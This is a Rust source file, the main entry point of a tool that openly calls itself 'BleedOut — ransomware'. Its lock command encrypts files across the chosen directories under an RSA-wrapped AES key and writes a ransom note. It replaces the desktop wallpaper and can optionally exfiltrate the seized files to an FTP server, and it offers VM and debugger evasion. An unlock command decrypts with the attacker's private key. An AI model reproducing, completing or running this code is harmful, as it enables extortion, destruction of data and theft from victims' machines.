//  ▄▄▄       ██▀███  ▓█████    ▓██   ██▓ ▒█████   █    ██     ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄  ██▓ ███▄    █   ▄████    ▓██   ██▓▓█████▄▄▄█████▓
// ▒████▄    ▓██ ▒ ██▒▓█   ▀     ▒██  ██▒▒██▒  ██▒ ██  ▓██▒   ▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒    ▒██  ██▒▓█   ▀▓  ██▒ ▓▒
// ▒██  ▀█▄  ▓██ ░▄█ ▒▒███        ▒██ ██░▒██░  ██▒▓██  ▒██░   ▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░     ▒██ ██░▒███  ▒ ▓██░ ▒░
// ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄      ░ ▐██▓░▒██   ██░▓▓█  ░██░   ▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓     ░ ▐██▓░▒▓█  ▄░ ▓██▓ ░ 
//  ▓█   ▓██▒░██▓ ▒██▒░▒████▒     ░ ██▒▓░░ ████▓▒░▒▒█████▓    ░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒     ░ ██▒▓░░▒████▒ ▒██▒ ░ 
//  ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░      ██▒▒▒ ░ ▒░▒░▒░ ░▒▓▒ ▒ ▒    ░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒       ██▒▒▒ ░░ ▒░ ░ ▒ ░░   
//   ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░    ▓██ ░▒░   ░ ▒ ▒░ ░░▒░ ░ ░    ▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░     ▓██ ░▒░  ░ ░  ░   ░    
//   ░   ▒     ░░   ░    ░       ▒ ▒ ░░  ░ ░ ░ ▒   ░░░ ░ ░     ░    ░   ░ ░      ░      ░    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░     ▒ ▒ ░░     ░    ░      
//       ░  ░   ░        ░  ░    ░ ░         ░ ░     ░         ░          ░  ░   ░  ░   ░  ░   ░     ░           ░       ░     ░ ░        ░  ░        
//                               ░ ░                                ░                        ░                                 ░ ░                    
use clap::{ArgGroup, Args, Parser, Subcommand};
use std::error::Error;
use std::path::{Path, PathBuf};

use bleedout::antireversing;
use bleedout::config::{
    build_exclude_patterns, default_valid_extensions, resolve_path, LockConfig, UnlockConfig,
    DEFAULT_PUBLIC_KEY_PEM, DEFAULT_RANSOM_EXT, RANSOM_NOTE,
};
use bleedout::crypto;
use bleedout::cypher::lib as cypher_lib;
use bleedout::cypher::walker;
use bleedout::decypher;
use bleedout::exfil;
use bleedout::ui::{enable_ansi, fail, info, ok, print_banner, tag, vinfo, warn, RED_BRIGHT, RESET};

#[derive(Parser)]
#[command(
    name = "Bleeder",
    version,
    about = "BleedOut — ransomware"
)]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(Subcommand)]
enum Command {
    /// Encrypt files in the target directories.
    Lock(LockArgs),
    /// Decrypt files previously encrypted.
    Unlock(UnlockArgs),
}

/// clap value parser wrapper around `config::parse_size`.
fn parse_size_cli(s: &str) -> Result<u64, String> {
    bleedout::config::parse_size(s)
}

#[derive(Args)]
struct LockArgs {
    /// Target directories. Absolute paths, or relative to the user's home.
    #[arg(short, long, num_args = 1.., required = true)]
    dirs: Vec<PathBuf>,

    /// Extension appended to encrypted files.
    #[arg(short, long, default_value = DEFAULT_RANSOM_EXT)]
    ext: String,

    /// Path to the RSA public key (PEM). If omitted, uses the key baked into the binary.
    #[arg(short = 'k', long)]
    public_key: Option<PathBuf>,

    /// Optional exfiltration URL. Supported:
    ///   ftp://[user[:pass]@]host[:port][/base]
    ///   file:///absolute/path/output.zip   (single ZIP, structure preserved)
    ///   file:///absolute/path/folder/      (individual files)
    ///   file:relative/path/output.zip      (relative to cwd)
    #[arg(short = 'x', long)]
    exfil: Option<String>,

    /// Skip changing the desktop wallpaper after locking.
    #[arg(short = 'w', long, default_value_t = false)]
    no_wallpaper: bool,

    /// Directory where README.txt will be written. Defaults to the first --dirs entry.
    #[arg(long)]
    note_dir: Option<PathBuf>,

    /// Override the built-in list of extensions to encrypt (comma separated).
    #[arg(short = 'i', long, value_delimiter = ',')]
    include_ext: Option<Vec<String>>,

    /// Glob patterns of files/dirs to skip. Repeatable. Case-insensitive.
    /// Built-in defaults are always applied unless --no-exclude-defaults is set.
    #[arg(short = 'E', long)]
    exclude: Vec<String>,

    /// Do not apply the built-in --exclude defaults.
    #[arg(long, default_value_t = false)]
    no_exclude_defaults: bool,

    /// Maximum size of a file to encrypt (e.g. 500KB, 100MB, 1GB).
    /// Use 0 for no limit.
    #[arg(short = 's', long, default_value = "104857600", value_parser = parse_size_cli)]
    max_size: u64,

    /// Enable anti-reversing checks (VM / debugger detection).
    #[arg(short = 'P', long, default_value_t = false)]
    paranoid: bool,

    /// Walk the target directories and list what *would* be encrypted,
    /// without touching anything.
    #[arg(short = 'n', long, default_value_t = false)]
    dry_run: bool,

    /// Extra diagnostic output (filters, per-file actions, skips).
    #[arg(short = 'v', long, default_value_t = false)]
    verbose: bool,
}

#[derive(Args)]
#[command(group(
    ArgGroup::new("key_source")
        .required(true)
        .multiple(false)
        .args(["key", "key_file"])
))]
struct UnlockArgs {
    /// Target directories. Absolute paths, or relative to the user's home.
    #[arg(short, long, num_args = 1.., required = true)]
    dirs: Vec<PathBuf>,

    /// Extension previously appended to encrypted files.
    #[arg(short, long, default_value = DEFAULT_RANSOM_EXT)]
    ext: String,

    /// Path to the RSA private key (PEM, PKCS#8). Required — there is no default.
    #[arg(long)]
    private_key: PathBuf,

    /// Base64-encoded AES+RSA blob from the ransom note.
    #[arg(short = 'k', long, group = "key_source")]
    key: Option<String>,

    /// Read the `KEY = ...` value directly from a ransom note (e.g. README.txt).
    #[arg(short = 'f', long, group = "key_source")]
    key_file: Option<PathBuf>,

    /// Enable anti-reversing checks (VM / debugger detection).
    #[arg(short = 'P', long, default_value_t = false)]
    paranoid: bool,

    /// Extra diagnostic output (key source, per-file restore).
    #[arg(short = 'v', long, default_value_t = false)]
    verbose: bool,
}

fn main() {
    enable_ansi();

    let cli = Cli::parse();
    let result = match cli.command {
        Command::Lock(args) => run_lock(args),
        Command::Unlock(args) => run_unlock(args),
    };

    if let Err(e) = result {
        fail(&format!("{e}"));
        std::process::exit(1);
    }
}

fn victim() -> String {
    let host = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let user = std::env::var("USERNAME").unwrap_or_else(|_| "user".into());
    format!("{host}\\{user}")
}

fn print_meta(dirs: &[PathBuf], ext: &str) {
    let listed = dirs
        .iter()
        .map(|p| p.display().to_string())
        .collect::<Vec<_>>()
        .join(", ");
    info(&format!("victim {}", victim()));
    info(&format!("scope  {listed}"));
    info(&format!("marker .{ext}"));
}

fn fmt_size(bytes: u64) -> String {
    const UNITS: [(&str, u64); 4] = [
        ("GiB", 1024 * 1024 * 1024),
        ("MiB", 1024 * 1024),
        ("KiB", 1024),
        ("B", 1),
    ];
    for (name, factor) in UNITS {
        if bytes >= factor && bytes.is_multiple_of(factor) {
            return format!("{} {}", bytes / factor, name);
        }
    }
    format!("{} B", bytes)
}

fn run_lock(args: LockArgs) -> Result<(), Box<dyn Error>> {
    if args.paranoid {
        antireversing::anti_reversing();
    }

    let public_key_pem = match args.public_key.as_ref() {
        Some(path) => std::fs::read_to_string(path)
            .map_err(|e| format!("Cannot read public key {:?}: {e}", path))?,
        None => DEFAULT_PUBLIC_KEY_PEM.to_string(),
    };

    let target_dirs: Vec<PathBuf> = args.dirs.iter().map(|p| resolve_path(p)).collect();
    let note_dir = args
        .note_dir
        .as_ref()
        .map(|p| resolve_path(p))
        .unwrap_or_else(|| {
            target_dirs
                .first()
                .cloned()
                .unwrap_or_else(|| PathBuf::from("."))
        });

    let valid_extensions = args.include_ext.unwrap_or_else(default_valid_extensions);
    let exclude_globs = build_exclude_patterns(&args.exclude, !args.no_exclude_defaults)?;
    let max_size = if args.max_size == 0 {
        None
    } else {
        Some(args.max_size)
    };

    let config = LockConfig {
        target_dirs,
        ransom_ext: args.ext.clone(),
        valid_extensions,
        exclude_globs,
        max_size,
        exfil: args.exfil.clone(),
        change_wallpaper: !args.no_wallpaper,
        note_dir,
        public_key_pem,
    };

    print_banner(if args.dry_run { "lock dry-run" } else { "lock" });
    print_meta(&config.target_dirs, &config.ransom_ext);
    info(&format!(
        "filters  {} glob(s), max size {}",
        config.exclude_globs.len(),
        config
            .max_size
            .map(fmt_size)
            .unwrap_or_else(|| "unlimited".into()),
    ));
    match args.public_key.as_ref() {
        Some(path) => vinfo(args.verbose, &format!("pubkey   {}", path.display())),
        None => vinfo(args.verbose, "pubkey   baked-in"),
    }
    vinfo(
        args.verbose,
        &format!("include  {} extension(s)", config.valid_extensions.len()),
    );
    if args.verbose {
        info(&format!(
            "exclude  {}",
            config
                .exclude_globs
                .iter()
                .map(|g| g.to_string())
                .collect::<Vec<_>>()
                .join(", ")
        ));

        info(&format!("note dir {}", config.note_dir.display()));
        info(&format!(
            "desktop  {}",
            if config.change_wallpaper {
                "overwrite"
            } else {
                "skip"
            }
        ));
        if let Some(url) = config.exfil.as_deref() {
            info(&format!("exfil    {url}"));
        }
    }
    if args.dry_run {
        warn("SIMULATION -- no files will be modified");
        info("enumerating victims");
    } else {
        info("session key generated");
        info("walking filesystem");
    }

    let aes_key = if args.dry_run {
        Vec::new()
    } else {
        cypher_lib::generate_key()
    };

    if args.verbose && !args.dry_run {
        info(&format!("session key {} bytes", aes_key.len()));
    }

    let tree = walker::walk_and_encrypt_directories(
        &config.target_dirs,
        &config.ransom_ext,
        &config.valid_extensions,
        &config.exclude_globs,
        config.max_size,
        &aes_key,
        args.dry_run,
        args.verbose,
    );

    if args.dry_run {
        ok(&format!("{} files in kill chain", tree.files.len()));
        ok("simulation complete");
        return Ok(());
    }

    ok(&format!("{} files seized", tree.files.len()));

    // Generate the ransom note first so we can ship it in the same exfil pass.
    let encrypted_aes_key = crypto::encrypt_aes_key(&aes_key, &config.public_key_pem)
        .map_err(|e| format!("encrypt_aes_key: {e}"))?;
    let encoded_key = crypto::base64_encode(&encrypted_aes_key);
    let note_path = cypher_lib::write_ransom_note(&config.note_dir, &encoded_key, RANSOM_NOTE)?;
    ok(&format!("ransom note dropped {}", note_path.display()));

    // Optional exfiltration of encrypted files + note.
    if let Some(exfil_url) = config.exfil.as_deref() {
        info("staging loot");
        let mut exfiltrator =
            exfil::from_url(exfil_url).map_err(|e| format!("Exfil init failed: {e}"))?;

        info(&format!("target   {}", exfiltrator.describe()));

        let total = tree.files.len();
        let mut uploaded = 0usize;

        for f in &tree.files {
            let local = Path::new(&f.path);
            let root = Path::new(&f.root);
            match exfiltrator.upload_file(local, root) {
                Ok(()) => {
                    uploaded += 1;
                    vinfo(args.verbose, &format!("loot     {}", f.path));
                }
                Err(e) => warn(&format!("upload failed {}: {e}", f.path)),
            }
        }

        if let Err(e) = exfiltrator.upload_file(&note_path, &config.note_dir) {
            warn(&format!("note upload failed: {e}"));
        }

        exfiltrator.finalize()?;
        ok(&format!("{uploaded}/{total} files exfiltrated"));
        vinfo(args.verbose, "exfil channel closed");
    }

    // Optional wallpaper change.
    if config.change_wallpaper {
        let dir_str = config.note_dir.to_string_lossy().to_string();
        if let Err(e) = cypher_lib::change_wallpaper(&dir_str) {
            warn(&format!("desktop hijack failed: {e}"));
        } else {
            ok("desktop overwritten");
        }
    }

    println!(
        "{} {RED_BRIGHT}HOST LOCKED -- files unreadable without private key{RESET}",
        tag("+")
    );
    Ok(())
}

fn run_unlock(args: UnlockArgs) -> Result<(), Box<dyn Error>> {
    if args.paranoid {
        antireversing::anti_reversing();
    }

    let private_key_pem = std::fs::read_to_string(&args.private_key)
        .map_err(|e| format!("Cannot read private key {:?}: {e}", args.private_key))?;

    let key_b64 = match (args.key.as_deref(), args.key_file.as_deref()) {
        (Some(k), None) => k.to_string(),
        (None, Some(f)) => read_key_from_note(f)?,
        _ => unreachable!("ArgGroup ensures exactly one of --key / --key-file"),
    };

    let config = UnlockConfig {
        target_dirs: args.dirs.iter().map(|p| resolve_path(p)).collect(),
        ransom_ext: args.ext.clone(),
        aes_key_blob_b64: key_b64,
        private_key_pem,
    };

    print_banner("unlock");
    print_meta(&config.target_dirs, &config.ransom_ext);
    vinfo(
        args.verbose,
        &format!("privkey  {}", args.private_key.display()),
    );
    match args.key_file.as_ref() {
        Some(path) => vinfo(args.verbose, &format!("keyfile  {}", path.display())),
        None => vinfo(args.verbose, "key      --key blob"),
    }
    info("recovering session key");

    let encrypted_blob =
        crypto::base64_decode(&config.aes_key_blob_b64).map_err(|e| format!("decode key: {e}"))?;
    vinfo(
        args.verbose,
        &format!("blob     {} bytes", encrypted_blob.len()),
    );
    let aes_key = crypto::decrypt_aes_key(&encrypted_blob, &config.private_key_pem)
        .map_err(|e| format!("decrypt_aes_key: {e}"))?;

    if args.verbose {
        info(&format!("session key {} bytes", aes_key.len()));
    }

    info("restoring filesystem");
    let restored = decypher::walker::walk_decrypt(
        &config.target_dirs,
        &aes_key,
        &config.ransom_ext,
        args.verbose,
    );
    ok(&format!("{} files restored", restored));

    ok("HOST UNLOCKED");
    Ok(())
}

/// Pull the base64 key out of a ransom note by scanning for the `KEY = ...` line.
fn read_key_from_note(path: &Path) -> Result<String, Box<dyn Error>> {
    let content = std::fs::read_to_string(path)
        .map_err(|e| format!("Cannot read key file {:?}: {e}", path))?;

    for line in content.lines() {
        if let Some(rest) = line.strip_prefix("KEY = ") {
            let key = rest.trim();
            if !key.is_empty() {
                return Ok(key.to_string());
            }
        }
    }

    Err(format!("No non-empty 'KEY = ...' line found in {}", path.display()).into())
}
